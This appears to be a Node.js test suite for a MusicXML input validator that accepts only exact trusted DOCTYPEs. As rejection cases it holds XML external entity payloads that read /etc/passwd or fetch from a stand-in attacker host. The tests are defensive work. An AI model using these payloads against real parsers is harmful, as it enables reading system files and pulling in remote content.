'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const {
  DEFAULT_MAX_XML_BYTES,
  XmlSafetyError,
  normalizeXmlInput,
} = require('../src/validation/xmlSafety');

const fixturePath = (name) => path.join(__dirname, 'fixtures', name);

const TRUSTED_MUSICXML_403_PARTWISE_DOCTYPE =
  '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 4.0.3 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">';
const TRUSTED_MUSICXML_31_PARTWISE_DOCTYPE =
  '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.1 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">';
const TRUSTED_MUSICXML_30_PARTWISE_DOCTYPE =
  '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">';
const TRUSTED_MUSICXML_20_PARTWISE_DOCTYPE =
  '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">';
const TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE =
  "<!DOCTYPE score-partwise PUBLIC '-//Recordare//DTD MusicXML 2.0 Partwise//EN' 'http://www.musicxml.org/dtds/2.0/partwise.dtd'>";

function expectCode(fn, code) {
  assert.throws(fn, (error) => {
    assert.ok(error instanceof XmlSafetyError);
    assert.equal(error.code, code);
    return true;
  });
}

test('accepts UTF-8 strings and buffers without altering the XML', () => {
  const xml = '<score-partwise/>';
  assert.equal(normalizeXmlInput(xml), xml);
  assert.equal(normalizeXmlInput(Buffer.from(xml, 'utf8')), xml);
});

test('accepts and strips exact trusted MusicXML 4.0.3, 3.1, 3.0 and bounded 2.0 partwise DOCTYPEs', () => {
  for (const [version, doctype] of [
    ['4.0.3', TRUSTED_MUSICXML_403_PARTWISE_DOCTYPE],
    ['3.1', TRUSTED_MUSICXML_31_PARTWISE_DOCTYPE],
    ['3.0', TRUSTED_MUSICXML_30_PARTWISE_DOCTYPE],
    ['2.0', TRUSTED_MUSICXML_20_PARTWISE_DOCTYPE],
    ['2.0', TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE],
  ]) {
    const xml = `<?xml version="1.0" encoding="UTF-8"?>\n${doctype}\n<score-partwise version="${version}"/>`;
    const normalized = normalizeXmlInput(xml);

    assert.doesNotMatch(normalized, /<!DOCTYPE/i);
    assert.match(normalized, /^<\?xml version="1\.0" encoding="UTF-8"\?>/);
    assert.match(normalized, new RegExp(`<score-partwise version="${version.replaceAll('.', '\\.')}"\\/>`));
    assert.equal(normalizeXmlInput(Buffer.from(xml, 'utf8')), normalized);
  }
});

test('accepts only the two bounded MusicXML 2.0 declaration paths without resolving them', () => {
  const genericDoubleQuoted = '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">\n<score-partwise version="2.0"/>';
  const versionedDoubleQuoted = '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd">\n<score-partwise version="2.0"/>';
  assert.doesNotMatch(normalizeXmlInput(genericDoubleQuoted), /<!DOCTYPE/i);
  assert.doesNotMatch(normalizeXmlInput(versionedDoubleQuoted), /<!DOCTYPE/i);

  for (const untrusted of [
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "file:///etc/passwd"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://attacker.example/2.0/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://attacker.example/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd.evil"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd.evil"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.1 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-timewise PUBLIC "-//Recordare//DTD MusicXML 2.0 Timewise//EN" "http://www.musicxml.org/dtds/timewise.dtd"><score-timewise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd" [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><score-partwise>&xxe;</score-partwise>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd" [<!ENTITY % pe SYSTEM "http://attacker.example/payload"> %pe;]><score-partwise/>',
    `${TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE}${TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE}<score-partwise/>`,
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd"><score-timewise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd"<score-partwise/>',
  ]) {
    expectCode(() => normalizeXmlInput(untrusted), 'UNSAFE_XML_DECLARATION');
  }
});

test('accepts exact trusted MusicXML 3.0 and 3.1 DOCTYPE quoting without widening identity', () => {
  const singleQuoted31 = "<!DOCTYPE score-partwise PUBLIC '-//Recordare//DTD MusicXML 3.1 Partwise//EN' 'http://www.musicxml.org/dtds/partwise.dtd'>\n<score-partwise version=\"3.1\"/>";
  const singleQuoted30 = "<!DOCTYPE score-partwise PUBLIC '-//Recordare//DTD MusicXML 3.0 Partwise//EN' 'http://www.musicxml.org/dtds/partwise.dtd'>\n<score-partwise version=\"3.0\"/>";
  assert.doesNotMatch(normalizeXmlInput(singleQuoted31), /<!DOCTYPE/i);
  assert.doesNotMatch(normalizeXmlInput(singleQuoted30), /<!DOCTYPE/i);

  for (const untrusted of [
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 4.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.1 Partwise//EN" "https://www.musicxml.org/dtds/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.0 Partwise//EN" "https://www.musicxml.org/dtds/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.1 Partwise//EN" "http://example.com/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.0 Partwise//EN" "http://www.musicxml.org/dtds/3.0/partwise.dtd"><score-partwise/>',
    '<!DOCTYPE score-timewise PUBLIC "-//Recordare//DTD MusicXML 3.1 Timewise//EN" "http://www.musicxml.org/dtds/timewise.dtd"><score-timewise/>',
    '<!DOCTYPE score-timewise PUBLIC "-//Recordare//DTD MusicXML 3.0 Timewise//EN" "http://www.musicxml.org/dtds/timewise.dtd"><score-timewise/>',
  ]) {
    expectCode(() => normalizeXmlInput(untrusted), 'UNSAFE_XML_DECLARATION');
  }
});

test('uses a five-megabyte default size limit', () => {
  assert.equal(DEFAULT_MAX_XML_BYTES, 5 * 1024 * 1024);
});

test('rejects empty input', () => {
  expectCode(() => normalizeXmlInput(' \n\t'), 'EMPTY_INPUT');
});

test('rejects inputs larger than the configured limit before parsing', () => {
  expectCode(() => normalizeXmlInput('<root/>', { maxBytes: 6 }), 'FILE_TOO_LARGE');
});

test('rejects invalid UTF-8, encoding declarations and null bytes', () => {
  expectCode(() => normalizeXmlInput(Buffer.from([0xc3, 0x28])), 'INVALID_ENCODING');
  expectCode(() => normalizeXmlInput('<root>\u0000</root>'), 'INVALID_ENCODING');
  expectCode(
    () => normalizeXmlInput('<?xml version="1.0" encoding="UTF-16"?><root/>'),
    'INVALID_ENCODING',
  );
});

test('rejects entity declarations and untrusted DOCTYPE declarations', () => {
  const unsafe = fs.readFileSync(fixturePath('invalid-doctype.musicxml'));
  expectCode(() => normalizeXmlInput(unsafe), 'UNSAFE_XML_DECLARATION');
  expectCode(() => normalizeXmlInput('<!ENTITY sample "value"><root/>'), 'UNSAFE_XML_DECLARATION');
  expectCode(
    () => normalizeXmlInput(
      '<!DOCTYPE score-partwise SYSTEM "file:///etc/passwd"><score-partwise/>',
    ),
    'UNSAFE_XML_DECLARATION',
  );
});

test('rejects internal subsets, duplicate declarations and mismatched roots for every trusted version', () => {
  for (const trustedDoctype of [
    TRUSTED_MUSICXML_403_PARTWISE_DOCTYPE,
    TRUSTED_MUSICXML_31_PARTWISE_DOCTYPE,
    TRUSTED_MUSICXML_30_PARTWISE_DOCTYPE,
    TRUSTED_MUSICXML_20_PARTWISE_DOCTYPE,
    TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE,
  ]) {
    expectCode(
      () => normalizeXmlInput(
        `${trustedDoctype.slice(0, -1)} [<!ELEMENT sample ANY>]>\n<score-partwise/>`,
      ),
      'UNSAFE_XML_DECLARATION',
    );

    expectCode(
      () => normalizeXmlInput(
        `${trustedDoctype}\n${trustedDoctype}\n<score-partwise/>`,
      ),
      'UNSAFE_XML_DECLARATION',
    );

    expectCode(
      () => normalizeXmlInput(
        `${trustedDoctype}\n<score-timewise/>`,
      ),
      'UNSAFE_XML_DECLARATION',
    );
  }
});

test('rejects entity-bearing trusted MusicXML 3.x declarations even when the public identifier is exact', () => {
  for (const trustedDoctype of [
    TRUSTED_MUSICXML_31_PARTWISE_DOCTYPE,
    TRUSTED_MUSICXML_30_PARTWISE_DOCTYPE,
  ]) {
    expectCode(
      () => normalizeXmlInput(
        `${trustedDoctype.slice(0, -1)} [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<score-partwise>&xxe;</score-partwise>`,
      ),
      'UNSAFE_XML_DECLARATION',
    );
  }
});

test('rejects unsupported input types and invalid limits', () => {
  expectCode(() => normalizeXmlInput({ xml: '<root/>' }), 'INVALID_ENCODING');
  expectCode(() => normalizeXmlInput('<root/>', { maxBytes: 0 }), 'INVALID_CONFIGURATION');
});
